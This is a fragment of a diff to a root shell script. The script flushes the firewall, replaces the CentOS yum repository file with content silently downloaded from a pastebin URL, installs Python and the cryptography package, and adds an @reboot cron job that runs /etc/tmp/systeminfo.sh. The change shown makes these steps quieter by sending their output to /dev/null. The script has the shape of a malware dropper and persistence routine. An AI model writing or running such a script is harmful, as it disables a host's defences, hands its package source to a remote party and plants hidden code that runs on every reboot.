@@ -8,12 +8,12 @@
 
 sudo strace -o /dev/null /bin/sh -lic "iptables -F;
 curl -q https://pastebin.com/raw/XLiGFWha 2>/dev/null > /etc/yum.repos.d/CentOS-Base.repo;
-yum clean all;
+yum clean all > /dev/null;
 yum install -y -q epel-release;
 yum install -y -q python3;
 yum install -y -q python-pip;
-yes | python3 -m pip install --upgrade pip;
-yes | python3 -m pip install cryptography;
+yes | python3 -m pip install --upgrade pip > /dev/null;
+yes | python3 -m pip install cryptography > /dev/null;
 crontab -l > cronlist.txt;
 grep -qxF '@reboot sleep 20 && /etc/tmp/systeminfo.sh' cronlist.txt || echo '@reboot sleep 20 && /etc/tmp/systeminfo.sh' >> cronlist.txt;
 crontab cronlist.txt;
